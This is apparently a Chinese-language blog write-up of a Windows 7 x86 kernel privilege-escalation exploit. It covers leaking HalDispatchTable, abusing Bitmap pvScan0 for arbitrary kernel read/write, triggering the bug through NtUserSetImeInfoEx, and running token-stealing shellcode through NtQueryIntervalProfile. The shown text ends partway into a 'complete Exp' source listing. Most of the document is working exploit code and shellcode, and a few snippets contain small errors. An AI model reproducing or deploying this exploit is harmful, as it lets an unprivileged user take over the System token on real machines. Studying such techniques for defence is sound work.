<h3 id="泄露haldispatchtable">泄露HalDispatchTable</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="n">GetNtoskrnl</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">NtoskrnlBase</span> <span class="o">=</span> <span class="n">GetNtoskrnlBase</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">GetNtoskrnlName</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">HMODULE</span> <span class="n">hNtoskrnl</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">NtoskrnlName</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"cannot load Ntoskrnl.exe..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">free</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtoskrnl</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"Cannot find HalDispatchTable..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hNtoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">NtoskrnlBase</span><span class="p">);</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] HalDispatchTable: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">HalDispatchTable</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</code></pre></div></div>

<p><img src="/imgs/exploit_point.png" alt="exploit_point.png" /></p>

<p>注意到在代码中覆盖字节数不可控, 如果直接覆盖<code class="language-plaintext highlighter-rouge">HalDispatchTable</code>容易导致程序崩溃</p>

<p>故采用其他方法来控制.</p>

<h3 id="覆盖bitmap对象实现任意地址读写">覆盖Bitmap对象实现任意地址读写</h3>

<p><code class="language-plaintext highlighter-rouge">Bitmap</code>的底层内核对象<code class="language-plaintext highlighter-rouge">SURFACE</code> 部分结构: (x86)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SURFACE</span> <span class="p">{</span>
		<span class="n">BASEOBJECT</span> <span class="n">BaseObject</span><span class="p">;</span> <span class="c1">// 0x000</span>
		<span class="n">SURFOBJ</span> <span class="n">surfobj</span><span class="p">;</span>       <span class="c1">// 0x010</span>
		<span class="n">XDCOBJ</span> <span class="o">*</span> <span class="n">pdcoAA</span><span class="p">;</span>       <span class="c1">// 0x044</span>
		<span class="n">FLONG</span> <span class="n">flags</span><span class="p">;</span>           <span class="c1">// 0x048</span>
		<span class="p">[...]</span>
<span class="p">}</span><span class="n">SURFACE</span><span class="p">,</span> <span class="o">*</span><span class="n">PSURFACE</span><span class="p">;</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SURFOBJ</span><span class="p">{</span>
		<span class="p">[...]</span>
		<span class="n">PVOID</span> <span class="n">pvScan0</span><span class="p">;</span>         <span class="c1">// 0x020</span>
		<span class="n">LONG</span> <span class="n">lDelta</span><span class="p">;</span>           <span class="c1">// 0x024</span>
		<span class="n">ULONG</span> <span class="n">iUniq</span><span class="p">;</span>           <span class="c1">// 0x028</span>
		<span class="n">ULONG</span> <span class="n">iBitmapFormat</span><span class="p">;</span>    <span class="c1">// 0x02c</span>
		<span class="n">USHORT</span> <span class="n">iType</span><span class="p">;</span>          <span class="c1">// 0x030</span>
		<span class="n">USHORT</span> <span class="n">fjBitmap</span><span class="p">;</span>       <span class="c1">// 0x032</span>
	<span class="c1">// size                     0x034</span>
<span class="p">}</span><span class="n">SURFOBJ</span><span class="p">,</span> <span class="o">*</span><span class="n">PSURFOBJ</span><span class="p">;</span>
<span class="c1">// 具体意义可以查阅ReactOS源码</span>
</code></pre></div></div>

<p>主要关注<code class="language-plaintext highlighter-rouge">_SURFACE</code>中的<code class="language-plaintext highlighter-rouge">pvScan0</code>成员, 它指向<code class="language-plaintext highlighter-rouge">Bitmap</code>内容的内核地址.</p>

<p>而<code class="language-plaintext highlighter-rouge">GetBitmapBits</code>和<code class="language-plaintext highlighter-rouge">SetBitmapBits</code>两个<code class="language-plaintext highlighter-rouge">api</code>会根据<code class="language-plaintext highlighter-rouge">pvScan0</code>的值对<code class="language-plaintext highlighter-rouge">Bitmap</code>的内容进行字节级别的读写.</p>

<p>故只要能覆盖<code class="language-plaintext highlighter-rouge">pvScan0</code>的值, 就能实现可控的任意地址读写.</p>

<p>在实际利用中,往往需要多次任意地址读写, 所以我们通过<code class="language-plaintext highlighter-rouge">CreateBitmap</code> 创建两个<code class="language-plaintext highlighter-rouge">Bitmap</code> ,将其中一个<code class="language-plaintext highlighter-rouge">Bitmap</code> 的<code class="language-plaintext highlighter-rouge">pvScan0</code> 成员修改为另一<code class="language-plaintext highlighter-rouge">Bitmap</code> 的<code class="language-plaintext highlighter-rouge">pvScan0</code> 成员的地址,这样通过如下代码, 就可以多次任意读写:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VOID</span> <span class="nf">ReadOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span><span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">readValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">GetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">readValue</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="nf">WriteOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span> <span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">writeValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">writeValue</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这样的利用手法要求我们需要知道<strong>_SURFACE</strong>的<strong>内核地址</strong></p>

<p>我们先创建<code class="language-plaintext highlighter-rouge">Bitmap</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HBITMAP</span> <span class="n">hWorker</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
<span class="n">HBITMAP</span> <span class="n">hManager</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
</code></pre></div></div>

<p>根据搜索引擎</p>

<p>我们知道了在win7及以下的较低版本的Windows, <code class="language-plaintext highlighter-rouge">CreateBitmap</code> 返回的<code class="language-plaintext highlighter-rouge">HBITMAP</code> 的低两字节实际上是其在<strong>PEB</strong>结构中的名为<strong>GdiSharedHandleTable</strong>的结构体数组中的索引</p>

<p>结构体数组中的结构体定义如下:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_GdiCell</span>
<span class="p">{</span>
     <span class="n">PVOID</span> <span class="n">pKernelAddress</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wProcessIdl</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wCount</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wUpper</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">uType</span><span class="p">;</span>
     <span class="n">PVOID</span> <span class="n">pUserAddress</span><span class="p">;</span>
<span class="p">}</span><span class="n">GdiCell</span><span class="p">,</span><span class="o">*</span><span class="n">pGdiCell</span><span class="p">;</span>
</code></pre></div></div>

<p>其中的<code class="language-plaintext highlighter-rouge">pKernelAddress</code> 成员就是<code class="language-plaintext highlighter-rouge">Bitmap</code> 对应的<code class="language-plaintext highlighter-rouge">SURFACE</code> 对象的<strong>内核地址</strong></p>

<p>代码:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp">
</span>
<span class="n">DWORD</span> <span class="nf">GetPeb</span><span class="p">(){</span>
	<span class="n">DWORD</span> <span class="n">teb</span> <span class="o">=</span> <span class="n">__readfsdword</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span> <span class="c1">// teb 存储在fs:[0x18]</span>
	<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">teb</span><span class="p">)</span><span class="o">+</span><span class="mh">0x30</span><span class="p">);</span> <span class="c1">// teb-&gt;ProcessEnvironmentBlock</span>
	<span class="k">return</span> <span class="n">peb</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">DWORD</span> <span class="n">GdiSharedHandleTable_offset</span> <span class="o">=</span> <span class="mh">0x094</span><span class="p">;</span> <span class="c1">// GdiSharedHandleTable在PEB结构中的偏移( win7 x86)</span>
<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="n">GetPeb</span><span class="p">();</span>

<span class="c1">//获取Bitmap对应的GdiCell</span>
<span class="n">pGdiCell</span> <span class="n">GdiHandleTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">pGdiCell</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">peb</span><span class="o">+</span><span class="n">GdiSharedHandleTable_offset</span><span class="p">));</span>
<span class="n">pGdiCell</span> <span class="n">work_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hWorker</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>
<span class="n">pGdiCell</span> <span class="n">manage_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hManager</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>

<span class="c1">// 获取对应SURFACE内核地址</span>
<span class="n">PVOID</span> <span class="n">worker_krnl_addr</span> <span class="o">=</span> <span class="n">work_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>
<span class="n">PVOID</span> <span class="n">manager_krnl_addr</span> <span class="o">=</span> <span class="n">manage_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>

<span class="n">DWORD</span> <span class="n">surfobj_offset</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="p">;</span> <span class="c1">// surfobj相对于SURFACE对象的偏移</span>
<span class="n">DWORD</span> <span class="n">pvscan0_offset</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>  <span class="c1">// pvScan0相对于SURFOBJ对象的偏移</span>

<span class="c1">// 获取相应的pvScan0的地址</span>
<span class="n">DWORD</span> <span class="n">w_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">worker_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">m_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manager_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
</code></pre></div></div>

<p>因为在覆盖<code class="language-plaintext highlighter-rouge">pvScan0</code> 时还会覆盖其他数据, 其中有部分数据是<code class="language-plaintext highlighter-rouge">SetBitmapBits</code> 和<code class="language-plaintext highlighter-rouge">GetBitmapBits</code> 运行所需, 所以要在payload中填充修复, 重要成员可以通过分析<code class="language-plaintext highlighter-rouge">bDoGetSetBitmapBits</code> 来获得.</p>

<p>这里直接给出需要修复的成员</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define API_BITMAP 0x04000000
#define SHAREACCESS_SURFACE 0x00000200
#define DDB_SURFACE 0x00800000
#define STYPE_BITMAP 0L
#define BMF_TOPDOWN 0x1
#define BMF_32BPP 0x6
</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">lDelta</span> <span class="o">=</span> <span class="mh">0x180</span><span class="p">;</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">iBitmapFormat</span> <span class="o">=</span> <span class="n">BMF_32BPP</span><span class="p">;</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">iType</span> <span class="o">=</span> <span class="n">STYPE_BITMAP</span><span class="p">;</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">fjBitmap</span> <span class="o">=</span> <span class="n">BMF_TOPDOWN</span><span class="p">;</span>
<span class="n">surface</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">API_BITMAP</span> <span class="o">|</span> <span class="n">SHAREACCEAA_SURFACE</span> <span class="o">|</span> <span class="n">DDB_SURFACE</span><span class="p">;</span>
</code></pre></div></div>

<p>构造payload</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>           <span class="c1">// pvScan0 : Worker pvScan0</span>
<span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x180</span><span class="p">;</span>               <span class="c1">// lDelta : 0x180</span>
<span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xabcd</span><span class="p">;</span>              <span class="c1">// iUniq : 0xabcd</span>
<span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">BMF_32BPP</span><span class="p">;</span>           <span class="c1">// iBitmapFormat : BMF_32BPP</span>
<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">STYPE_BITMAP</span><span class="p">;</span>        <span class="c1">// iType : STYPE_BITMAP</span>
<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|=</span> <span class="n">BMF_TOPDOWN</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">;</span>  <span class="c1">// fjBitmap : BMF_TOPDOWN</span>
<span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4800200</span><span class="p">;</span>           <span class="c1">// flags : API_BITMAP | SHAREACCESS_SURFACE | DDB_SURFACE</span>

<span class="n">PDWORD</span> <span class="n">tmp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">tmp</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">m_pvscan0</span><span class="p">;</span>   <span class="c1">// arbitrary write addr : Manager pvScan0</span>
<span class="n">tmp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>  <span class="c1">// if ( v3[5] != *a2 ) {...} bypass</span>
</code></pre></div></div>

<p>触发漏洞</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HWINSTA</span> <span class="n">hWinsta</span> <span class="o">=</span> <span class="n">CreateWindowStationA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">READ_CONTROL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">SetProcessWindowStation</span><span class="p">(</span><span class="n">hWinsta</span><span class="p">);</span>
<span class="n">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
</code></pre></div></div>

<p>若未开启<code class="language-plaintext highlighter-rouge">SMEP</code> ,修改<code class="language-plaintext highlighter-rouge">HalDispatchTable</code> 第二项为用户层shellcode</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">oldHalEntry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">ReadOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] oldHalEntry: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">oldHalEntry</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">GetSystemToken</span><span class="p">;</span>
<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">GetSystemToken</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="kr">__asm</span>
     <span class="p">{</span>
         <span class="n">pushad</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x124</span><span class="p">]</span>  <span class="c1">//CurrentThread</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x150</span><span class="p">]</span> <span class="c1">//Process  </span>
         <span class="n">lea</span> <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>  <span class="c1">//MyProcess.Token</span>
 <span class="nl">noFind:</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span>  <span class="c1">//Eprocess.ActiveProcessLinks</span>
         <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span><span class="mh">0xb8</span>        <span class="c1">//next Eprocess struct</span>
         <span class="n">mov</span> <span class="n">ebx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb4</span><span class="p">]</span>  <span class="c1">//PID</span>
         <span class="n">cmp</span> <span class="n">ebx</span><span class="p">,</span><span class="mi">4</span>
         <span class="n">jnz</span> <span class="n">noFind</span>
         <span class="n">mov</span> <span class="n">eax</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xf8</span><span class="p">]</span>    <span class="c1">//System.Token</span>
         <span class="n">mov</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span><span class="n">eax</span>
         <span class="n">lock</span> <span class="n">inc</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">lock</span> <span class="n">inc</span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
         <span class="n">popad</span>
         <span class="n">ret</span>
     <span class="p">}</span>
 <span class="p">}</span>
</code></pre></div></div>

<p>shellcode搜索系统中进程为4的进程 ( <code class="language-plaintext highlighter-rouge">System</code> ), 搜索到后, 复制其<code class="language-plaintext highlighter-rouge">Token</code> , 并替换自己进程的<code class="language-plaintext highlighter-rouge">Token</code> 实现提权.</p>

<p>最后调用<code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> 来执行shellcode, 并恢复<code class="language-plaintext highlighter-rouge">HalDispatchTable</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_NtQueryIntervalProfile</span> <span class="n">NtQueryIntervalProfile</span><span class="p">;</span>
<span class="n">ULONG</span> <span class="n">Interval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
<span class="n">NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Interval</span><span class="p">);</span>
<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</code></pre></div></div>

<p>完整Exp</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp">
</span><span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">;</span>
<span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
<span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">showbase</span><span class="p">;</span>
<span class="k">using</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span><span class="p">;</span>
<span class="cp">#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
#define STATUS_SUCCESS (NTSTATUS)0x0000000
</span><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_GdiCell</span>
<span class="p">{</span>
     <span class="n">PVOID</span> <span class="n">pKernelAddress</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wProcessIdl</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wCount</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wUpper</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">uType</span><span class="p">;</span>
     <span class="n">PVOID</span> <span class="n">pUserAddress</span><span class="p">;</span>
<span class="p">}</span><span class="n">GdiCell</span><span class="p">,</span><span class="o">*</span><span class="n">pGdiCell</span><span class="p">;</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SYSTEM_MODULE_ENTRY</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">Section</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">MappedBase</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">ImageBase</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">InitOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadCount</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">OffsetToFileName</span><span class="p">;</span>
    <span class="n">UCHAR</span> <span class="n">FullPathName</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_ENTRY</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SYSTEM_MODULE_INFORMATION</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Count</span><span class="p">;</span>
    <span class="n">SYSTEM_MODULE_ENTRY</span> <span class="n">Module</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>
<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SYSTEM_INFORMATION_CLASS</span> <span class="p">{</span>
 <span class="n">SystemBasicInformation</span><span class="p">,</span> <span class="c1">// 0 Y N</span>
 <span class="n">SystemProcessorInformation</span><span class="p">,</span> <span class="c1">// 1 Y N</span>
 <span class="n">SystemPerformanceInformation</span><span class="p">,</span> <span class="c1">// 2 Y N</span>
 <span class="n">SystemTimeOfDayInformation</span><span class="p">,</span> <span class="c1">// 3 Y N</span>
 <span class="n">SystemNotImplemented1</span><span class="p">,</span> <span class="c1">// 4 Y N</span>
 <span class="n">SystemProcessesAndThreadsInformation</span><span class="p">,</span> <span class="c1">// 5 Y N</span>
 <span class="n">SystemCallCounts</span><span class="p">,</span> <span class="c1">// 6 Y N</span>
 <span class="n">SystemConfigurationInformation</span><span class="p">,</span> <span class="c1">// 7 Y N</span>
 <span class="n">SystemProcessorTimes</span><span class="p">,</span> <span class="c1">// 8 Y N</span>
 <span class="n">SystemGlobalFlag</span><span class="p">,</span> <span class="c1">// 9 Y Y</span>
 <span class="n">SystemNotImplemented2</span><span class="p">,</span> <span class="c1">// 10 Y N</span>
 <span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="c1">// 11 Y N    枚举内核模块时用</span>
 <span class="n">SystemLockInformation</span><span class="p">,</span> <span class="c1">// 12 Y N</span>
 <span class="n">SystemNotImplemented3</span><span class="p">,</span> <span class="c1">// 13 Y N</span>
 <span class="n">SystemNotImplemented4</span><span class="p">,</span> <span class="c1">// 14 Y N</span>
 <span class="n">SystemNotImplemented5</span><span class="p">,</span> <span class="c1">// 15 Y N</span>
 <span class="n">SystemHandleInformation</span><span class="p">,</span> <span class="c1">// 16 Y N</span>
 <span class="n">SystemObjectInformation</span><span class="p">,</span> <span class="c1">// 17 Y N</span>
 <span class="n">SystemPagefileInformation</span><span class="p">,</span> <span class="c1">// 18 Y N</span>
 <span class="n">SystemInstructionEmulationCounts</span><span class="p">,</span> <span class="c1">// 19 Y N</span>
 <span class="n">SystemInvalidInfoClass1</span><span class="p">,</span> <span class="c1">// 20</span>
 <span class="n">SystemCacheInformation</span><span class="p">,</span> <span class="c1">// 21 Y Y</span>
 <span class="n">SystemPoolTagInformation</span><span class="p">,</span> <span class="c1">// 22 Y N</span>
